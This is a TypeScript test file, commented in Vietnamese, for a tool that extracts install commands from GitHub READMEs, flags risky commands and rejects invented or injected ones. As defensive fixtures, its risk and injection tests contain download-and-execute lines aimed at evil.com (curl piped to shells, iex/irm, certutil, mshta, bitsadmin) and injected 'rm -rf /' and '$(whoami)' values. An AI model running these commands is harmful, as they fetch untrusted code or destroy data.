import { describe, expect, it } from 'vitest';
import {
  HeDieuHanhCli,
  NhomCachCai,
  PhanCungYeuCau,
  boDauNhacShell,
  trichTenGoiTuLenhTho,
  coCachCaiCliHopLe,
} from '@forgestore/types';
import {
  bocTachHuongDanTuCodeBlocks,
  kiemTraLenhNguyenVan,
  kiemTraRuiRoCao,
  locVaChuanHoaHuongDanCaiDat,
  nhanDienNhomLenh,
  sapXepCachCai,
  trichMucCaiDat,
  trichXuatHuongDanCliBangQuyTac,
  xacDinhHeDieuHanhLenh,
  tenGoiKhopTenRepo,
} from './cli-guide-extractor.util';

describe('cli-guide-extractor.util', () => {
  const sampleReadme = `# Open WebUI

Open WebUI is an extensible, self-hosted AI interface.

## Features
- Extensible UI
- Markdown support

## Installation

### Using pip
\`\`\`bash
pip install open-webui
open-webui serve
\`\`\`

### Using Docker
\`\`\`bash
docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui ghcr.io/open-webui/open-webui:main
\`\`\`

### One-line Script
\`\`\`bash
curl -sSfL https://example.com/install.sh | sh
\`\`\`

## Configuration
Configure environment variables here.

## License
MIT
`;

  describe('trichMucCaiDat', () => {
    it('trích xuất đúng mục Installation và dừng trước mục Configuration kế tiếp', () => {
      const section = trichMucCaiDat(sampleReadme);
      expect(section).toContain('## Installation');
      expect(section).toContain('pip install open-webui');
      expect(section).toContain('docker run');
      expect(section).toContain('curl -sSfL');
      // Phải dừng trước mục cùng cấp kế tiếp ## Configuration
      expect(section).not.toContain('## Configuration');
      expect(section).not.toContain('## License');
    });

    it('giữ nguyên các khối code bên trong mục cài đặt', () => {
      const section = trichMucCaiDat(sampleReadme);
      expect(section).toContain('```bash');
      expect(section).toContain('```');
    });

    it('trả về rỗng nếu README không có mục cài đặt nào', () => {
      const noInstallReadme = `# My Project\n\nJust a simple app.\n\n## License\nMIT`;
      expect(trichMucCaiDat(noInstallReadme)).toBe('');
    });

    it('giới hạn tối đa 6000 ký tự', () => {
      const longContent = 'a'.repeat(8000);
      const longReadme = `## Setup\n\`\`\`bash\n${longContent}\n\`\`\``;
      const section = trichMucCaiDat(longReadme, 6000);
      expect(section.length).toBeLessThanOrEqual(6000);
    });

    it('BE-01: trích xuất thành công mục cài đặt có tiêu đề tiếng Việt', () => {
      const vnReadme = `# Dự Án Hay\n\nPhần mềm mã nguồn mở.\n\n## Hướng dẫn cài đặt\n\`\`\`bash\npip install du-an\n\`\`\`\n\n## Tác giả\nNguyen Van A`;
      const section = trichMucCaiDat(vnReadme);
      expect(section).toContain('## Hướng dẫn cài đặt');
      expect(section).toContain('pip install du-an');
      expect(section).not.toContain('## Tác giả');
    });

    it('BE-01: tự động đóng khối code ``` nếu bị cắt ngang tại giới hạn ký tự', () => {
      const codeInside = 'npm install my-package\n'.repeat(300);
      const longReadme = `## Setup\n\`\`\`bash\n${codeInside}\`\`\``;
      const section = trichMucCaiDat(longReadme, 200);
      const fenceCount = (section.match(/```/g) || []).length;
      expect(fenceCount % 2).toBe(0);
      expect(section.endsWith('```')).toBe(true);
    });
  });

  describe('nhanDienNhomLenh', () => {
    it('nhận diện chính xác 9 nhóm lệnh', () => {
      expect(nhanDienNhomLenh('winget install Mozilla.Firefox')).toBe(NhomCachCai.WINGET);
      expect(nhanDienNhomLenh('scoop install git')).toBe(NhomCachCai.SCOOP);
      expect(nhanDienNhomLenh('pip install torch')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('pip3 install open-webui')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('python -m pip install -U whisper')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('uv pip install fastapi')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('conda install -c conda-forge ffmpeg')).toBe(NhomCachCai.CONDA);
      expect(nhanDienNhomLenh('npm i -g pnpm')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('pnpm add -g @forgestore/cli')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('cargo install ripgrep')).toBe(NhomCachCai.CARGO);
      expect(nhanDienNhomLenh('go install github.com/jesseduffield/lazygit@latest')).toBe(
        NhomCachCai.GO,
      );
      expect(nhanDienNhomLenh('docker run -d -p 8080:80 nginx')).toBe(NhomCachCai.DOCKER);
      expect(nhanDienNhomLenh('docker compose up -d')).toBe(NhomCachCai.DOCKER);
      expect(nhanDienNhomLenh('git clone https://github.com/user/repo')).toBe(NhomCachCai.NGUON);
      expect(nhanDienNhomLenh('./setup.sh')).toBe(NhomCachCai.NGUON);
    });

    it('D-36: npm/pnpm/yarn/bun cài thư viện vào dự án (không -g) vẫn là lệnh cài hợp lệ của kho', () => {
      expect(nhanDienNhomLenh('npm install ioredis')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('yarn add electron-builder --dev')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('pnpm add zod')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('npm install --global serve')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('npm install serve -g')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('yarn global add serve')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('bun add -g serve')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('npx create-vite')).toBe(NhomCachCai.NPM);
    });

    it('BE-01: loại bỏ shell prompt $, #, > trước khi nhận diện nhóm lệnh', () => {
      expect(nhanDienNhomLenh('$ pip install flask')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('# winget install vscode')).toBe(NhomCachCai.WINGET);
      expect(nhanDienNhomLenh('> scoop install neovim')).toBe(NhomCachCai.SCOOP);
    });

    it('trả về null nếu không phải lệnh cài đặt nhận diện được', () => {
      expect(nhanDienNhomLenh('echo "hello world"')).toBeNull();
      expect(nhanDienNhomLenh('ls -la')).toBeNull();
    });
  });

  describe('xacDinhHeDieuHanhLenh', () => {
    it('gắn nhãn LINUX_MAC cho lệnh quản lý gói Linux/macOS và dấu hiệu Unix thắng Windows khi cùng dòng (Mục 5)', () => {
      expect(xacDinhHeDieuHanhLenh('sudo apt-get install ffmpeg')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('brew install ffmpeg')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('pacman -S git')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('make install', 'Linux / macOS setup guide')).toBe(
        HeDieuHanhCli.LINUX_MAC,
      );

      // Mục 5: brew/apt cài powershell -> dấu hiệu Unix thắng, luôn ra LINUX_MAC
      expect(xacDinhHeDieuHanhLenh('brew install --cask powershell')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('sudo apt-get install -y powershell')).toBe(
        HeDieuHanhCli.LINUX_MAC,
      );
    });

    it('gắn nhãn LINUX_MAC cho các lệnh chỉ chạy trên Unix bất kể ngữ cảnh (Mục 7)', () => {
      // nvm-sh/nvm
      expect(
        xacDinhHeDieuHanhLenh(
          'curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash',
        ),
      ).toBe(HeDieuHanhCli.LINUX_MAC);
      // seaweedfs
      expect(
        xacDinhHeDieuHanhLenh(
          'curl -fsSL https://raw.githubusercontent.com/seaweedfs/seaweedfs/master/docker/install.sh | sh',
        ),
      ).toBe(HeDieuHanhCli.LINUX_MAC);
      // runanywhere-sdks
      expect(xacDinhHeDieuHanhLenh('curl -sSL https://raw.githubusercontent.com/... | bash')).toBe(
        HeDieuHanhCli.LINUX_MAC,
      );
      // wei-shaw/sub2api
      expect(
        xacDinhHeDieuHanhLenh('curl -fsSL https://sub2api.example.com/install | sudo bash'),
      ).toBe(HeDieuHanhCli.LINUX_MAC);
    });

    it('gắn nhãn WINDOWS cho lệnh Windows đặc thù', () => {
      expect(xacDinhHeDieuHanhLenh('winget install Git.Git')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('scoop install ffmpeg')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('choco install ffmpeg')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('.\\install.bat')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('git clone ...', 'Windows PowerShell instructions')).toBe(
        HeDieuHanhCli.WINDOWS,
      );
    });

    it('lệnh đa nền tảng KHÔNG nhận LINUX_MAC từ ngữ cảnh, chỉ nhận WINDOWS khi ngữ cảnh chỉ định Windows (Mục 7)', () => {
      // 3b1b/manim (pip)
      expect(
        xacDinhHeDieuHanhLenh('pip install manimgl', 'runs-on: ubuntu-latest\nLinux setup'),
      ).toBe(HeDieuHanhCli.DUNG_CHUNG);
      // kilo-org/kilocode (npm)
      expect(
        xacDinhHeDieuHanhLenh('npm install -g @kilocode/cli', 'Ubuntu Debian Linux guide'),
      ).toBe(HeDieuHanhCli.DUNG_CHUNG);
      // sharkdp/fd (npm)
      expect(xacDinhHeDieuHanhLenh('npm install -g fd-find', 'Linux distributions')).toBe(
        HeDieuHanhCli.DUNG_CHUNG,
      );
      // unslothai/unsloth (uv pip)
      expect(xacDinhHeDieuHanhLenh('uv pip install unsloth', 'Linux / MacOS instructions')).toBe(
        HeDieuHanhCli.DUNG_CHUNG,
      );
      // mempalace/mempalace (docker pull)
      expect(xacDinhHeDieuHanhLenh('docker pull mempalace/mempalace', 'Ubuntu 22.04 LTS')).toBe(
        HeDieuHanhCli.DUNG_CHUNG,
      );
      // OpenHands/OpenHands (docker run)
      expect(xacDinhHeDieuHanhLenh('docker run -it -p 3000:3000 openhands', 'Linux setup')).toBe(
        HeDieuHanhCli.DUNG_CHUNG,
      );

      // Khi ngữ cảnh chỉ định rõ ràng Windows (không có Linux) -> gán WINDOWS
      expect(xacDinhHeDieuHanhLenh('pip install manimgl', '### Windows\npip install manimgl')).toBe(
        HeDieuHanhCli.WINDOWS,
      );
    });
  });

  describe('kiemTraRuiRoCao', () => {
    it('phát hiện lệnh curl | sh và wget | bash', () => {
      const res = kiemTraRuiRoCao('curl -fsSL https://get.docker.com | sh');
      expect(res.ruiRoCao).toBe(true);
      expect(res.lyDo).toBeDefined();

      const res2 = kiemTraRuiRoCao('wget -qO- https://example.com/install | bash');
      expect(res2.ruiRoCao).toBe(true);
    });

    it('phát hiện lệnh PowerShell irm | iex', () => {
      const res = kiemTraRuiRoCao('irm https://astral.sh/uv/install.ps1 | iex');
      expect(res.ruiRoCao).toBe(true);
      expect(res.lyDo).toContain('PowerShell');
    });

    it('phát hiện lệnh sudo và container privileged', () => {
      expect(kiemTraRuiRoCao('sudo apt update').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --privileged -d myimage').ruiRoCao).toBe(true);
    });

    it('phát hiện lệnh Set-ExecutionPolicy Bypass', () => {
      const res = kiemTraRuiRoCao('Set-ExecutionPolicy Bypass -Scope Process');
      expect(res.ruiRoCao).toBe(true);
    });

    it('SEC-01: phát hiện các mẫu lệnh rủi ro cao mở rộng (pipe vào zsh/python/pwsh, -enc, LoLBins, docker.sock)', () => {
      expect(kiemTraRuiRoCao('curl -sL https://evil.com | zsh').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('wget -O- https://evil.com | python3').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('curl https://evil.com | pwsh').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('powershell.exe -enc AAAA==').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('powershell -ExecutionPolicy Bypass -File a.ps1').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('certutil -urlcache -split -f https://evil.com/a.exe').ruiRoCao).toBe(
        true,
      );
      expect(kiemTraRuiRoCao('mshta http://evil.com/run.hta').ruiRoCao).toBe(true);
      expect(
        kiemTraRuiRoCao('docker run -v /var/run/docker.sock:/var/run/docker.sock alpine').ruiRoCao,
      ).toBe(true);
      expect(kiemTraRuiRoCao('docker run --cap-add=ALL myimage').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --cap-add=SYS_ADMIN myimage').ruiRoCao).toBe(true);
    });

    it('SEC-VULN-03: phát hiện cú pháp nguy hiểm không dùng pipe (iex irm, bash <(curl), docker --cap-add khoảng trắng, bitsadmin)', () => {
      // 1. iex / Invoke-Expression gọi trực tiếp irm/iwr
      expect(kiemTraRuiRoCao('iex (irm https://evil.com/install.ps1)').ruiRoCao).toBe(true);
      expect(
        kiemTraRuiRoCao('Invoke-Expression (Invoke-WebRequest https://evil.com/run.ps1)').ruiRoCao,
      ).toBe(true);
      expect(
        kiemTraRuiRoCao('iex (New-Object Net.WebClient).DownloadString("https://evil.com")')
          .ruiRoCao,
      ).toBe(true);

      // 2. Thay thế tiến trình (Process Substitution)
      expect(kiemTraRuiRoCao('bash <(curl -s https://evil.com/install.sh)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('sh <(wget -qO- https://evil.com/install.sh)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('zsh <(curl -fsSL https://raw.evil.com/script)').ruiRoCao).toBe(true);

      // 3. Docker --cap-add khoảng trắng và --pid=host
      expect(kiemTraRuiRoCao('docker run --cap-add ALL -d myapp').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --cap-add SYS_ADMIN ubuntu').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --pid=host -d container').ruiRoCao).toBe(true);

      // 4. Công cụ có sẵn Windows bitsadmin (LoLBin)
      expect(
        kiemTraRuiRoCao('bitsadmin /transfer jobname https://evil.com/mal.exe C:\\temp\\mal.exe')
          .ruiRoCao,
      ).toBe(true);
      expect(kiemTraRuiRoCao('bitsadmin /create evil_job').ruiRoCao).toBe(true);

      // 5. SEC-R4-04: Đường dẫn shell tuyệt đối, dash/ash, PowerShell shorthand và dot-sourcing
      expect(kiemTraRuiRoCao('curl -fsSL https://evil.com/install.sh | /bin/sh').ruiRoCao).toBe(
        true,
      );
      expect(kiemTraRuiRoCao('wget -qO- https://evil.com/setup | /usr/bin/bash').ruiRoCao).toBe(
        true,
      );
      expect(kiemTraRuiRoCao('curl -s https://evil.com/run | ash').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('dash <(curl -fsSL https://evil.com/test)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('powershell -e JABhID0A... -ex bypass').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('& (irm https://evil.com/script.ps1)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('. (iwr -useb https://evil.com/install.ps1)').ruiRoCao).toBe(true);
    });

    it('không báo rủi ro cho các lệnh cài chuẩn mực', () => {
      expect(kiemTraRuiRoCao('pip install whisper').ruiRoCao).toBe(false);
      expect(kiemTraRuiRoCao('winget install Mozilla.Firefox').ruiRoCao).toBe(false);
      expect(kiemTraRuiRoCao('docker run -p 3000:3000 app').ruiRoCao).toBe(false);
    });
  });

  describe('kiemTraLenhNguyenVan (Rule D-01)', () => {
    it('chấp thuận lệnh có thật trong README', () => {
      expect(kiemTraLenhNguyenVan('pip install open-webui', sampleReadme)).toBe(true);
      expect(kiemTraLenhNguyenVan('open-webui serve', sampleReadme)).toBe(true);
    });

    it('từ chối lệnh bịa do AI tự chế tham số hoặc sai lệch', () => {
      expect(
        kiemTraLenhNguyenVan('pip install open-webui --extra-flag-not-in-readme', sampleReadme),
      ).toBe(false);
      expect(kiemTraLenhNguyenVan('winget install OpenWebUI.Client', sampleReadme)).toBe(false);
    });

    it('bỏ qua khoảng trắng đầu và cuối dòng', () => {
      expect(kiemTraLenhNguyenVan('   pip install open-webui   \n', sampleReadme)).toBe(true);
    });

    it('so khớp nguyên dòng: từ chối chuỗi con bị AI cắt xén cờ hoặc tham số', () => {
      const readmeWithFullCommand = `# App\n\`\`\`bash\npip install open-webui --extra-index-url https://example.com/simple\n\`\`\``;
      // Cắt xén cờ --extra-index-url: trước đây includes() chấp nhận, giờ bắt buộc phải từ chối
      expect(kiemTraLenhNguyenVan('pip install open-webui', readmeWithFullCommand)).toBe(false);
      // Khớp nguyên dòng hoàn chỉnh: chấp nhận
      expect(
        kiemTraLenhNguyenVan(
          'pip install open-webui --extra-index-url https://example.com/simple',
          readmeWithFullCommand,
        ),
      ).toBe(true);
    });
  });

  describe('locVaChuanHoaHuongDanCaiDat', () => {
    it('loại bỏ triệt để lệnh bịa và giữ lại lệnh thật kèm cờ rủi ro chuẩn xác', () => {
      const aiOutput = {
        cachCai: [
          {
            ten: 'Cài đặt bằng pip',
            nhom: NhomCachCai.PIP,
            heDieuHanh: HeDieuHanhCli.DUNG_CHUNG,
            phanCung: PhanCungYeuCau.CPU,
            yeuCau: ['Python 3.10+'],
            buoc: [
              { moTa: 'Cài gói', lenh: 'pip install open-webui' },
              { moTa: 'Lệnh bịa do AI hallucinate', lenh: 'fake-command --invented-by-ai' },
            ],
          },
          {
            ten: 'Cách cài hoàn toàn bịa',
            nhom: NhomCachCai.WINGET,
            heDieuHanh: HeDieuHanhCli.WINDOWS,
            phanCung: PhanCungYeuCau.KHONG_RO,
            buoc: [
              { moTa: 'Lệnh winget không có trong readme', lenh: 'winget install invented.app' },
            ],
          },
          {
            ten: 'Cài bằng script',
            nhom: NhomCachCai.NGUON,
            heDieuHanh: HeDieuHanhCli.LINUX_MAC,
            phanCung: PhanCungYeuCau.CPU,
            buoc: [
              {
                moTa: 'Tải và chạy script',
                lenh: 'curl -sSfL https://example.com/install.sh | sh',
              },
            ],
          },
        ],
      };

      const ketQua = locVaChuanHoaHuongDanCaiDat(
        aiOutput,
        sampleReadme,
        'https://github.com/org/repo',
      );

      expect(ketQua).not.toBeNull();
      // Cách cài hoàn toàn bịa phải bị xóa bỏ
      expect(ketQua?.cachCai.length).toBe(2);

      // Cách 1: pip chỉ còn 1 bước hợp lệ, lệnh bịa bị loại
      const pipCach = ketQua?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
      expect(pipCach).toBeDefined();
      expect(pipCach?.buoc.length).toBe(1);
      expect(pipCach?.buoc[0]?.lenh).toBe('pip install open-webui');

      // Cách 2: script có curl | sh phải được gắn cờ rủi ro cao bởi code
      const scriptCach = ketQua?.cachCai.find((c) => c.nhom === NhomCachCai.NGUON);
      expect(scriptCach).toBeDefined();
      expect(scriptCach?.buoc[0]?.ruiRoCao).toBe(true);
      expect(scriptCach?.buoc[0]?.canhBaoRuiRo).toBeDefined();
      expect(ketQua?.coRuiRoCao).toBe(true);
    });

    it('sắp xếp thứ tự ưu tiên chuẩn WINGET -> SCOOP -> PIP -> DOCKER -> NGUON', () => {
      const danhSach = [
        {
          ten: 'Docker',
          nhom: NhomCachCai.DOCKER,
          heDieuHanh: HeDieuHanhCli.DUNG_CHUNG,
          phanCung: PhanCungYeuCau.CPU,
          buoc: [],
        },
        {
          ten: 'Winget',
          nhom: NhomCachCai.WINGET,
          heDieuHanh: HeDieuHanhCli.WINDOWS,
          phanCung: PhanCungYeuCau.CPU,
          buoc: [],
        },
        {
          ten: 'Pip',
          nhom: NhomCachCai.PIP,
          heDieuHanh: HeDieuHanhCli.DUNG_CHUNG,
          phanCung: PhanCungYeuCau.CPU,
          buoc: [],
        },
      ];

      const sorted = sapXepCachCai(danhSach);
      expect(sorted.map((s) => s.nhom)).toEqual([
        NhomCachCai.WINGET,
        NhomCachCai.PIP,
        NhomCachCai.DOCKER,
      ]);
    });
  });

  describe('bocTachHuongDanTuCodeBlocks (Fallback / Offline)', () => {
    it('bóc tách tự động các lệnh từ code blocks khi không dùng AI', () => {
      const section = trichMucCaiDat(sampleReadme);
      const res = bocTachHuongDanTuCodeBlocks(section, sampleReadme, 'https://github.com/org/repo');

      expect(res).not.toBeNull();
      expect(res?.cachCai.length).toBeGreaterThanOrEqual(2);

      const nhoms = res?.cachCai.map((c) => c.nhom);
      expect(nhoms).toContain(NhomCachCai.PIP);
      expect(nhoms).toContain(NhomCachCai.DOCKER);
      expect(res?.coRuiRoCao).toBe(true); // có lệnh curl | sh
    });
  });

  describe('P3B-16.3 & P3B-16.9: trichXuatHuongDanCliBangQuyTac (README thật & quy tắc thuần)', () => {
    it('D-36: thư viện npm cài vào dự án được giữ, lệnh gỡ và cập nhật cũng cục bộ (không -g)', () => {
      const readme = [
        '# ioredis',
        '',
        '## Install',
        '',
        '```sh',
        'npm install ioredis',
        '```',
        '',
      ].join('\n');
      const res = trichXuatHuongDanCliBangQuyTac(readme, 'https://github.com/redis/ioredis');

      expect(res?.cachCai).toHaveLength(1);
      expect(res?.cachCai[0]?.lenhGo).toBe('npm uninstall ioredis');
      expect(res?.cachCai[0]?.lenhCapNhat).toBe('npm update ioredis');
    });

    it('npm cài toàn máy vẫn gỡ và cập nhật bằng -g', () => {
      const readme = [
        '# serve',
        '',
        '## Install',
        '',
        '```sh',
        'npm install -g serve',
        '```',
        '',
      ].join('\n');
      const res = trichXuatHuongDanCliBangQuyTac(readme, 'https://github.com/vercel/serve');

      expect(res?.cachCai[0]?.lenhGo).toBe('npm uninstall -g serve');
      expect(res?.cachCai[0]?.lenhCapNhat).toBe('npm update -g serve');
    });

    it('trích xuất thành công README có winget và scoop của Fastfetch', () => {
      const fastfetchReadme = `# Fastfetch
A neofetch-like tool for fetching system information and displaying them prettily.

## Installation

### Windows
Via winget:
\`\`\`cmd
winget install --id Fastfetch-cli.Fastfetch -e
\`\`\`

Via Scoop:
\`\`\`powershell
scoop install fastfetch
\`\`\`

## Usage
\`\`\`bash
fastfetch
\`\`\`
`;
      const res = trichXuatHuongDanCliBangQuyTac(
        fastfetchReadme,
        'https://github.com/fastfetch-cli/fastfetch',
      );

      expect(res).not.toBeNull();
      expect(res?.nguon).toBe('README');
      expect(res?.cachCai.length).toBe(2);

      // Winget
      const wingetMethod = res?.cachCai.find((c) => c.trinhQuanLy === 'winget');
      expect(wingetMethod).toBeDefined();
      expect(wingetMethod?.tenGoi).toBe('Fastfetch-cli.Fastfetch');
      expect(wingetMethod?.lenhCapNhat).toBe('winget upgrade --id Fastfetch-cli.Fastfetch');
      expect(wingetMethod?.lenhGo).toBe('winget uninstall --id Fastfetch-cli.Fastfetch');

      // Scoop
      const scoopMethod = res?.cachCai.find((c) => c.trinhQuanLy === 'scoop');
      expect(scoopMethod).toBeDefined();
      expect(scoopMethod?.tenGoi).toBe('fastfetch');
      expect(scoopMethod?.lenhCapNhat).toBe('scoop update fastfetch');
      expect(scoopMethod?.lenhGo).toBe('scoop uninstall fastfetch');
    });

    it('trích xuất thành công README Oh My Posh với winget và lệnh rủi ro cao irm|iex', () => {
      const ohMyPoshReadme = `# Oh My Posh
A prompt theme engine for any shell.

## Setup

\`\`\`powershell
winget install JanDeDobbeleer.OhMyPosh -s winget
\`\`\`

Manual install:
\`\`\`powershell
irm https://ohmyposh.dev/install.ps1 | iex
\`\`\`
`;
      const res = trichXuatHuongDanCliBangQuyTac(ohMyPoshReadme);
      expect(res).not.toBeNull();
      expect(res?.coRuiRoCao).toBe(true);

      const wingetMethod = res?.cachCai.find((c) => c.trinhQuanLy === 'winget');
      expect(wingetMethod?.tenGoi).toBe('JanDeDobbeleer.OhMyPosh');
      expect(wingetMethod?.lenhGo).toBe('winget uninstall --id JanDeDobbeleer.OhMyPosh');

      const irmMethod = res?.cachCai.find((c) => c.buoc.some((b) => b.ruiRoCao));
      expect(irmMethod).toBeDefined();
      expect(irmMethod?.buoc[0].lenh).toContain('irm https://ohmyposh.dev/install.ps1 | iex');
      expect(irmMethod?.buoc[0].canhBaoRuiRo).toBeDefined();
    });

    it('trích xuất thành công từ dòng inline code khi không có code fence', () => {
      const inlineReadme = `# Cool CLI App
To install, simply run \`pip install cool-cli\` on your terminal.
`;
      const res = trichXuatHuongDanCliBangQuyTac(inlineReadme);
      expect(res).not.toBeNull();
      expect(res?.cachCai[0]?.trinhQuanLy).toBe('pip');
      expect(res?.cachCai[0]?.tenGoi).toBe('cool-cli');
      expect(res?.cachCai[0]?.lenhGo).toBe('pip uninstall -y cool-cli');
    });

    it('trích xuất thành công dòng có tiền tố Install: không có dấu nháy ngược (🟡 Điểm Vàng 1)', () => {
      const prefixReadme = `# Cool App
This is a modern terminal tool.

Install: winget install --id Cool.App -e

## License
MIT
`;
      const res = trichXuatHuongDanCliBangQuyTac(prefixReadme);
      expect(res).not.toBeNull();
      expect(res?.cachCai[0]?.trinhQuanLy).toBe('winget');
      expect(res?.cachCai[0]?.tenGoi).toBe('Cool.App');
      expect(res?.cachCai[0]?.lenhGo).toBe('winget uninstall --id Cool.App');
    });

    it('không bắt nhầm lệnh dev/contributing trong văn xuôi khi README không có mục cài đặt riêng (🟡 Điểm Vàng 1 & 🔴 Lỗi Đỏ 1)', () => {
      const proseWithoutInstall = `# Python AI Library
A powerful machine learning framework.

${'Some description prose here. '.repeat(200)}

## Contributing
To develop locally, please install dependencies:
\`\`\`bash
pip install -r requirements.txt
\`\`\`
`;
      // Section contributing nằm ngoài 4.000 ký tự đầu và không phải mục cài đặt
      const res = trichXuatHuongDanCliBangQuyTac(proseWithoutInstall);
      expect(res).toBeNull();
    });

    it('từ chối sinh lệnh nếu câu lệnh cài trong README chứa injection', () => {
      const maliciousReadme = `## Install
\`\`\`bash
winget install --id bad; rm -rf / -e
\`\`\`
`;
      const res = trichXuatHuongDanCliBangQuyTac(maliciousReadme);
      // Lệnh bị loại hoặc không có trinhQuanLy/tenGoi hợp lệ
      expect(res?.cachCai.some((c) => c.tenGoi === 'bad; rm -rf /')).toBe(false);
    });

    it('nhận tag phiên bản, gói scope, các dạng pip/uv và dấu nhắc shell', () => {
      const mau = [
        ['npm install -g openclaw@latest --allow-scripts=openclaw', 'npm', 'openclaw'],
        ['npm install -g @scope/pkg@1.2.3', 'npm', '@scope/pkg'],
        ['uv tool install ruff@latest', 'pip', 'ruff'],
        ['> winget install MoeruAI.AIRI', 'winget', 'MoeruAI.AIRI'],
        ['python -m pip install nanobot-ai', 'pip', 'nanobot-ai'],
        ['$ npm install -g pnpm@latest', 'npm', 'pnpm'],
        ['PS C:\\Users\\dev> pipx install ruff@next', 'pip', 'ruff'],
        ['py -m pip install black@1.2.3', 'pip', 'black'],
      ];
      for (const [lenh, trinhQuanLy, tenGoi] of mau) {
        const readme = `## Installation\n\`\`\`bash\n${lenh}\n\`\`\``;
        const res = trichXuatHuongDanCliBangQuyTac(readme);
        expect(res?.cachCai.map(({ trinhQuanLy: pm, tenGoi: pkg }) => `${pm}:${pkg}`)).toContain(
          `${trinhQuanLy}:${tenGoi}`,
        );
      }
    });

    it('không cho cú pháp tag làm yếu chốt chặn lệnh nguy hiểm hoặc tên gói sai', () => {
      const readme = `## Installation
\`\`\`bash
npm install -g openclaw@latest; rm -rf /
npm install -g openclaw@latest$(whoami)
npm install -g openclaw@bad tag
\`\`\``;
      const res = trichXuatHuongDanCliBangQuyTac(readme);
      expect(res?.cachCai.some((c) => c.tenGoi === 'openclaw')).toBe(false);
    });
  });
  describe('Dấu nhắc shell trong README (lỗi ripgrep)', () => {
    it('boDauNhacShell bỏ $, >, %, PS> nhưng giữ nguyên lệnh sạch', () => {
      expect(boDauNhacShell('$ winget install X.Y')).toBe('winget install X.Y');
      expect(boDauNhacShell('> scoop install rg')).toBe('scoop install rg');
      expect(boDauNhacShell('% npm i -g foo')).toBe('npm i -g foo');
      expect(boDauNhacShell('PS> scoop install rg')).toBe('scoop install rg');
      expect(boDauNhacShell('PS C:\\Users\\a> scoop install rg')).toBe('scoop install rg');
      expect(boDauNhacShell('winget install X.Y')).toBe('winget install X.Y');
    });

    it('trichTenGoiTuLenhTho nhận lệnh có dấu nhắc nhưng vẫn chặn chèn lệnh', () => {
      expect(trichTenGoiTuLenhTho('$ winget install BurntSushi.ripgrep.MSVC')).toEqual({
        trinhQuanLy: 'winget',
        tenGoi: 'BurntSushi.ripgrep.MSVC',
      });
      expect(trichTenGoiTuLenhTho('PS> scoop install ripgrep')?.tenGoi).toBe('ripgrep');
      expect(trichTenGoiTuLenhTho('$ scoop install a; rm -rf /')).toBeNull();
      expect(trichTenGoiTuLenhTho('$ scoop install $(whoami)')).toBeNull();
    });

    it('README kiểu ripgrep (mọi lệnh có "$ ") vẫn ra cách cài hợp lệ, lệnh lưu là lệnh sạch', () => {
      const readme = [
        '### Installation',
        '',
        'If you are a Windows Winget user:',
        '',
        '```',
        '$ winget install BurntSushi.ripgrep.MSVC',
        '```',
        '',
        'If you are a Windows Scoop user:',
        '',
        '```',
        '$ scoop install ripgrep',
        '```',
      ].join('\n');
      const res = trichXuatHuongDanCliBangQuyTac(readme, 'https://github.com/x/y#readme');
      expect(res).not.toBeNull();
      const winget = res!.cachCai.find((c) => c.trinhQuanLy === 'winget');
      expect(winget?.tenGoi).toBe('BurntSushi.ripgrep.MSVC');
      expect(winget?.buoc[0]?.lenh).toBe('winget install BurntSushi.ripgrep.MSVC');
      expect(res!.cachCai.some((c) => c.trinhQuanLy === 'scoop' && c.tenGoi === 'ripgrep')).toBe(
        true,
      );
    });
  });
});

describe('P3B-25.12: quét cả README nhưng chỉ nhận gói có tên khớp tên repo', () => {
  const DEM = 'Lorem ipsum dolor sit amet. '.repeat(250);
  const url = (repo: string) => `https://github.com/${repo}#readme`;
  const cach = (md: string, repo: string) =>
    (trichXuatHuongDanCliBangQuyTac(md, url(repo))?.cachCai ?? [])
      .filter((c) => c.trinhQuanLy && c.tenGoi)
      .map((c) => `${c.trinhQuanLy}:${c.tenGoi}`);

